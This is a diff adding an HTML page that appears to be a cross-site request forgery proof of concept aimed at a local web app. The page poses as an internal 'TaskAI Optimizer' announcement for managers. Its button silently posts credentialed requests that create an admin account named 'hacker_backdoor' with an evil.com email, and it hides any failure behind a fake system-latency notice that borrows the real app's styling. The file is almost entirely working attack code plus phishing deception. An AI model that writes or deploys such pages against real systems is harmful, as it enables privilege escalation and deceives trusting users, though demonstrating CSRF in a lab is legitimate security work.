@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CorpoTech Solutions - TaskAI Optimizer</title>
+    <!-- Using the exact same CSS as the real app -->
+    <link rel="stylesheet" href="http://localhost:5000/static/css/style.css">
+</head>
+<body>
+
+    <nav class="navbar">
+        <div class="container">
+            <h1>CorpoTech Solutions</h1>
+            <ul class="nav-links">
+                <li><a href="#">IT Digital Transformation</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="form-container" style="margin-top: 4rem; max-width: 650px;">
+            
+            <h2 style="font-size: 2rem; margin-bottom: 2rem;">🚀 Introducing TaskAI Optimizer</h2>
+            
+            <p style="font-size: 1.15rem; line-height: 1.8; color: #555; margin-bottom: 1.5rem;">
+                Boost your team's productivity by 40%. Our new enterprise AI tool automatically 
+                reassigns, prioritizes, and optimizes your ongoing tasks based on deadlines and workloads.
+            </p>
+            
+            <p style="font-size: 1rem; color: #666; margin-bottom: 2.5rem;">
+                <em>Pilot program exclusively available for Department Managers.</em>
+            </p>
+
+            <button id="attack-btn" class="btn btn-primary" style="padding: 1rem 2.5rem; font-size: 1.2rem;" onclick="silentAttack()">
+                Launch TaskAI Optimizer
+            </button>
+
+            <!-- Using the real app's .alert-warning class for the fake error -->
+            <div id="fake-error" class="alert alert-warning" style="display: none; margin-top: 2rem; text-align: left; font-size: 1rem;">
+                <strong>⚠️ System Notice:</strong><br>
+                The TaskAI Optimizer module is currently experiencing high latency due to internal API migration (JIRA-8842).<br><br>
+                Your request has been queued, but the UI is temporarily unavailable. No further action is required. 
+                IT Support has been notified automatically.
+            </div>
+        </div>
+    </div>
+
+    <div style="text-align: center; margin-top: 3rem; font-size: 0.85rem; color: #999;">
+        &copy; 2023 CorpoTech Solutions. Confidential - Internal Use Only. 
+        <br>If you did not expect this email, please contact helpdesk@corpotech.com
+    </div>
+
+    <script>
+        function silentAttack() {
+            const formData = new FormData();
+            formData.append('username', 'hacker_backdoor');
+            formData.append('email', 'hacker@evil.com');
+            formData.append('password', 'Hacked123!');
+            formData.append('role', 'admin');
+
+            fetch('http://localhost:5000/admin/users/create', {
+                method: 'POST',
+                body: formData,
+                credentials: 'include'
+            }).catch(() => {
+                // silence any network errors
+            });
+
+            // Updated to use the new ID
+            document.getElementById('attack-btn').style.display = 'none';
+            document.getElementById('fake-error').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
